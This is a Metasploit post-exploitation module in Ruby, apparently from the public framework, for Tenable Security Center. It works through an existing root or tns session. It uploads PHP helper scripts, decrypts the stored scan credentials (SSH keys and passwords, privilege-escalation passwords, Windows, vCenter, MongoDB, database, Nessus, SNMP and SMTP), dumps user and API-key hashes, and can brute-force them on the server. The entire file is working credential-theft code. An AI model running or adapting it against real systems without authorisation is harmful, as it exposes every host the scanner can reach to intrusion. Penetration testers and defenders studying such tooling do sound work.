##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  include Msf::Post::Linux::System
  include Msf::Post::Linux::Priv
  include Msf::Post::File
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Tenable Security Center',
        'Description' => %q{
          This module collects credentials and setup information
          from Tenable Security Center. root or TNS user permissions
          are required. We don't utilize SC's builtin backup
          functionality as that requires SC to be shut down.
          The module works in 2 phases:

          Phase 1: gather all passwords which can be decrypted. These
          are non-user ones such as credentials used for scans, creds
          for the Nessus servers, SMTP, etc.

          Phase 2: handle hashed passwords processing. SC uses SHA-512
          and PBKDF2 according to the documentation, but the implementation
          (salt+hash vs hash+salt) is unknown due to the source code being
          protected by SourceGuardian. To get around this, we use a php
          script on server to brute force the passwords. Note this will
          use SC's resources. The crack attempt rate is ~6/sec on a test
          instance, so you'll want a small password list.

          Tested against SC 6.7.2 on RHEL9
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die',
        ],
        'Platform' => ['linux'],
        'SessionTypes' => ['shell', 'meterpreter'],
        'References' => [
          [ 'URL', 'https://docs.tenable.com/security-center/Content/EncryptionStrength.htm']
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )
    register_options [
      OptPath.new('WORDLIST', [false, 'The path to an optional wordlist'])
    ]
    register_advanced_options [
      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])
    ]
  end

  def run
    unless is_root? || whoami == 'tns'
      fail_with(Failure::NoAccess, "Root permission or tns user required. Root permissions: #{is_root?}, username: #{whoami}")
    end
    fail_with(Failure::NotFound, 'Security Center not found (/opt/sc/src/defines.php)') unless file?('/opt/sc/src/defines.php')

    defines = read_file('/opt/sc/src/defines.php')
    version = defines.match(/define\("SC_VERSION",\s*"([^"]+)"\)/)[1]
    print_good("Security Center Version: #{version}")

    # XXX why isnt this working
    sc_service_data = {
      host: ::Rex::Socket.getaddress(session.sock.peerhost, true),
      address: ::Rex::Socket.getaddress(session.sock.peerhost, true),
      port: '443',
      service_name: 'tenable security center',
      name: 'tenable security center',
      protocol: 'tcp',
      info: version.to_s,
      workspace_id: myworkspace_id
    }
    report_service(sc_service_data)

    command_prefix = ''
    command_postfix = ''
    if is_root?
      command_prefix = "su - tns -s /bin/bash -c '/opt/sc/support/bin/php "
      command_postfix = "'"
    end

    # Phase 1
    script_path = "#{datastore['WritableDir']}/#{Rex::Text.rand_text_alphanumeric(8..10)}"
    vprint_status("Uploading database cred decryptor to #{script_path}")
    fail_with(Failure::BadConfig, "Unable to write to #{script_path}") unless upload_file(script_path, ::File.join(Msf::Config.data_directory, 'post', 'tenable', 'security_center', 'pull_encrypted_database_fields.php'))
    vprint_status("Running cred dumper: #{command_prefix}#{script_path} -json#{command_postfix}")
    output = cmd_exec("#{command_prefix}#{script_path} -json#{command_postfix}")
    rm_f(script_path)

    begin
      output = JSON.parse(output)
    rescue JSON::ParserError => e
      print_error("Error parsing JSON output: #{e}")
    end

    loot_path = store_loot('tenable.security_center.creds', 'application/json', session, output, 'creds.json', 'Security Center Decrypted Credentials JSON')
    print_good("Decrypted Security Center credentials stored to: #{loot_path}")

    tbl = Rex::Text::Table.new(
      'Header' => 'Decrypted Credentials',
      'Indent' => 1,
      'Columns' => ['Source', 'Table', 'Username', 'Decrypted Password', 'Other Fields']
    )

    decrypted_flag = ' [DECRYPTED]'
    ::Rex::Socket.getaddress(session.sock.peerhost, true)

    output.each do |cred|
      case cred['_table']
      when 'AppSSHCredential'
        service_data = {
          address: '0.0.0.0',
          port: '22',
          service_name: 'ssh',
          protocol: 'tcp',
          workspace_id: myworkspace_id
        }

        if cred['authType'] == 'password'
          credential_data = {
            origin_type: :service,
            module_fullname: fullname,
            username: cred['username'],
            private_data: cred['password'].gsub(decrypted_flag, ''),
            private_type: :password
          }
        else
          credential_data = {
            origin_type: :service,
            module_fullname: fullname,
            username: cred['username'],
            private_data: cred['privateKey'].gsub("\r\n", "\n"),
            private_type: :ssh_key
          }
        end

        credential_data.merge!(service_data)
        credential_core = create_credential(credential_data)

        login_data = {
          core: credential_core,
          status: Metasploit::Model::Login::Status::UNTRIED
        }

        login_data.merge!(service_data)
        create_credential_login(login_data)
        info = cred.fetch('passphrase', '').gsub(decrypted_flag, '')
        info = "SSH Key Passphrase: #{info.gsub(decrypted_flag, '')}" if info != ''

        tbl << [cred['_source'], cred['_table'], cred['username'], credential_data[:private_data].gsub("\n", ''), info]

        # check if they have privilege creds
        if cred.key?('escalationPassword') && cred['escalationPassword'].gsub(decrypted_flag, '') != ''
          credential_data = {
            origin_type: :service,
            module_fullname: fullname,
            username: cred.fetch('escalationUsername', cred.fetch('escalationSuUser', cred.fetch('escalationAccount', ''))).gsub(decrypted_flag, ''),
            private_data: cred['escalationPassword'].gsub(decrypted_flag, ''),
            private_type: :password
          }

          credential_data.merge!(service_data)
          credential_core = create_credential(credential_data)

          login_data = {
            core: credential_core,
            status: Metasploit::Model::Login::Status::UNTRIED
          }

          login_data.merge!(service_data)
          tbl << [cred['_source'], cred['_table'], credential_data[:username], credential_data[:private_data], "Escalation method: #{cred['privilegeEscalation']}"]
        end
      when 'AppWindowsCredential'
        service_data = {
          address: '0.0.0.0',
          port: '445',
          service_name: 'smb',
          protocol: 'tcp',
          workspace_id: myworkspace_id
        }

        credential_data = {
          origin_type: :service,
          module_fullname: fullname,
          username: cred['username'],
          private_data: cred['password'].gsub(decrypted_flag, ''),
          private_type: :password
        }
        unless cred['domain'] == ''
          credential_data[:realm_key] = Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN
          credential_data[:realm_value] = cred['domain']
        end

        credential_data.merge!(service_data)
        credential_core = create_credential(credential_data)

        login_data = {
          core: credential_core,
          status: Metasploit::Model::Login::Status::UNTRIED
        }

        login_data.merge!(service_data)
        create_credential_login(login_data)

        tbl << [cred['_source'], cred['_table'], cred['username'], cred['password'].gsub(decrypted_flag, ''), '']
      when 'AppVMwarevCenterCredential'
        service_data = {
          address: cred['vcenter_host'],
          port: cred['vcenter_port'],
          service_name: 'vcenter',
          protocol: 'tcp',
          workspace_id: myworkspace_id
        }

        credential_data = {
          origin_type: :service,
          module_fullname: fullname,
          username: cred['vcenter_username'],
          private_data: cred['vcenter_password'].gsub(decrypted_flag, ''),
          private_type: :password
        }

        credential_data.merge!(service_data)
        credential_core = create_credential(credential_data)

        login_data = {
          core: credential_core,
          status: Metasploit::Model::Login::Status::UNTRIED
        }

        login_data.merge!(service_data)
        create_credential_login(login_data)

        tbl << [cred['_source'], cred['_table'], cred['vcenter_username'], cred['vcenter_password'].gsub(decrypted_flag, ''), '']
      when 'AppMongoDBCredential'
        service_data = {
          address: '0.0.0.0',
          port: cred['mongodb_port'],
          service_name: 'mongodb',
          protocol: 'tcp',
          workspace_id: myworkspace_id
        }

        credential_data = {
          origin_type: :service,
          module_fullname: fullname,
          username: cred['mongodb_username'],
          private_data: cred['mongodb_password'].gsub(decrypted_flag, ''),
          private_type: :password
        }

        credential_data.merge!(service_data)
        credential_core = create_credential(credential_data)

        login_data = {
          core: credential_core,
          status: Metasploit::Model::Login::Status::UNTRIED
        }

        login_data.merge!(service_data)
        create_credential_login(login_data)

        tbl << [cred['_source'], cred['_table'], cred['mongodb_username'], cred['mongodb_password'].gsub(decrypted_flag, ''), cred['mongodb_database']]
      when 'AppDatabaseCredential'
        service_data = {
          address: '0.0.0.0',
          port: cred['port'],
          service_name: cred['dbType'],
          protocol: 'tcp',
          workspace_id: myworkspace_id
        }

        credential_data = {
          origin_type: :service,
          module_fullname: fullname,
          username: cred['username'],
          private_data: cred['password'].gsub(decrypted_flag, ''),
          private_type: :password
        }

        credential_data.merge!(service_data)
        credential_core = create_credential(credential_data)

        login_data = {
          core: credential_core,
          status: Metasploit::Model::Login::Status::UNTRIED
        }

        login_data.merge!(service_data)
        create_credential_login(login_data)

        tbl << [cred['_source'], cred['_table'], cred['username'], cred['password'].gsub(decrypted_flag, ''), cred['dbType']]
      when 'Scanner'
        service_data = {
          address: cred['ip'],
          port: cred['port'],
          service_name: cred['nessusType'],
          protocol: 'tcp',
          workspace_id: myworkspace_id
        }

        credential_data = {
          origin_type: :service,
          module_fullname: fullname,
          username: cred['username'],
          private_data: cred['password'].gsub(decrypted_flag, ''),
          private_type: :password
        }

        credential_data.merge!(service_data)
        credential_core = create_credential(credential_data)

        login_data = {
          core: credential_core,
          status: Metasploit::Model::Login::Status::UNTRIED
        }

        login_data.merge!(service_data)
        create_credential_login(login_data)

        tbl << [cred['_source'], cred['_table'], cred['username'], cred['password'].gsub(decrypted_flag, ''), "Scanner Type: #{cred['nessusType']}"]
      when 'SNMPCredential'
        service_data = {
          address: '0.0.0.0',
          port: '161',
          service_name: 'snmp',
          protocol: 'udp',
          workspace_id: myworkspace_id
        }

        credential_data = {
          origin_type: :service,
          module_fullname: fullname,
          username: '',
          private_data: cred['communityString'].gsub(decrypted_flag, ''),
          private_type: :password
        }

        credential_data.merge!(service_data)
        credential_core = create_credential(credential_data)

        login_data = {
          core: credential_core,
          status: Metasploit::Model::Login::Status::UNTRIED
        }

        login_data.merge!(service_data)
        create_credential_login(login_data)

        tbl << [cred['_source'], cred['_table'], '', cred['communityString'].gsub(decrypted_flag, ''), '']
      when 'Configuration' # SMTP
        addr = if ::Rex::Socket.is_ip_addr?(cred['SMTPHost'])
                 cred['SMTPHost']
               else
                 begin
                   ::Rex::Socket.getaddress(cred['SMTPHost'], true)
                 rescue StandardError
                   '0.0.0.0'
                 end
               end

        service_data = {
          address: addr,
          port: cred['SMTPPort'],
          service_name: 'smtp',
          protocol: 'tcp',
          workspace_id: myworkspace_id
        }

        credential_data = {
          origin_type: :service,
          module_fullname: fullname,
          username: cred['SMTPUsername'],
          private_data: cred['SMTPPassword'].gsub(decrypted_flag, ''),
          private_type: :password
        }

        credential_data.merge!(service_data)
        credential_core = create_credential(credential_data)

        login_data = {
          core: credential_core,
          status: Metasploit::Model::Login::Status::UNTRIED
        }

        login_data.merge!(service_data)
        create_credential_login(login_data)

        tbl << [cred['_source'], cred['_table'], cred['SMTPUsername'], cred['SMTPPassword'].gsub(decrypted_flag, ''), '']
      else
        username = cred.fetch('username', '')
        password = cred.fetch('password', '').gsub(decrypted_flag, '')
        tbl << [cred['_source'], cred['_table'], username, password, '']
        print_warning('Please reivew loot for additional details')
      end
    end
    print_good(tbl.to_s)

    # Phase 2
    script_path = "#{datastore['WritableDir']}/#{Rex::Text.rand_text_alphanumeric(8..10)}"
    vprint_status("Uploading database cred dumper to #{script_path}")
    fail_with(Failure::BadConfig, "Unable to write to #{script_path}") unless upload_file(script_path, ::File.join(Msf::Config.data_directory, 'post', 'tenable', 'security_center', 'dump_crack_hashes.php'))
    vprint_status("Running cred dumper: #{command_prefix}#{script_path} -json#{command_postfix}")
    output = cmd_exec("#{command_prefix}#{script_path} -json#{command_postfix}")
    output = JSON.parse(output)

    loot_path = store_loot('tenable.security_center.creds.hashed', 'application/json', session, output, 'hashed_creds.json', 'Security Center Credentials JSON')
    print_good("Decrypted Security Center credentials stored to: #{loot_path}")

    cred_tbl = Rex::Text::Table.new(
      'Header' => 'Accounts Hashes',
      'Indent' => 1,
      'Columns' => ['UserID', 'Org', 'Username', 'Salt:Hash']
    )
    api_keys_tbl = Rex::Text::Table.new(
      'Header' => 'API Keys',
      'Indent' => 1,
      'Columns' => ['ID', 'User ID', 'Name', 'Access Key', 'Salt:Hash']
    )

    output.each do |cred|
      case cred['_table']
      when 'APIKey'
        api_keys_tbl << [cred['id'], cred['userAuthID'], cred['name'], cred['accessKey'], "#{cred['salt']}:#{cred['key']}"]
      when 'UserAuth'
        cred_tbl << [cred['id'], cred['orgID'], cred['username'], "#{cred['salt']}:#{cred['password']}"]
      end
    end

    print_good(api_keys_tbl.to_s) unless api_keys_tbl.rows.empty?
    print_good(cred_tbl.to_s) unless cred_tbl.rows.empty?

    # Phase 2.5
    unless datastore['WORDLIST']
      rm_f(script_path)
      return
    end

    ## lets estimate how long this may take
    wordlist = File.read(datastore['WORDLIST'])
    wordlist_lines = wordlist.lines.count
    estimate_seconds = (output.length * wordlist_lines) / 6.0
    estimate_minutes = (estimate_seconds / 60).round(1)
    print_warning("Estimated brute force time: #{estimate_minutes} minutes (#{output.length} users x #{wordlist_lines} words @ 6/sec)")
    print_warning('Waiting 5 seconds for user interuption if this is too long a time.')
    sleep(5)
    wordlist_path = "#{datastore['WritableDir']}/#{Rex::Text.rand_text_alphanumeric(8..10)}"
    vprint_status("Uploading wordlist to: #{wordlist_path}")
    fail_with(Failure::BadConfig, "Unable to write to #{wordlist_path}") unless upload_file(wordlist_path, datastore['WORDLIST'])
    output = cmd_exec("#{command_prefix}#{script_path} -json -crack #{wordlist_path}#{command_postfix}")
    rm_f(script_path)
    rm_f(wordlist_path)
    # remove first line, it contains stats: Done. 36 words in 6.27s (6/sec). 2/5 cracked.
    output = JSON.parse(output.lines[1..].join)
    cracked_tbl = Rex::Text::Table.new(
      'Header' => 'Cracked Credentials',
      'Indent' => 1,
      'Columns' => ['ID', 'User', 'Password', 'Admin']
    )
    output.each do |cred|
      cracked_tbl << [cred['id'], cred['username'], cred['password'], cred['isAdmin']]
      credential_data = {
        origin_type: :service,
        module_fullname: fullname,
        username: cred['username'],
        private_data: cred['password'],
        private_type: :password
      }

      credential_data.merge!(sc_service_data)
      create_credential(credential_data)
    end

    print_good(cracked_tbl.to_s) unless cracked_tbl.rows.empty?
  end
end
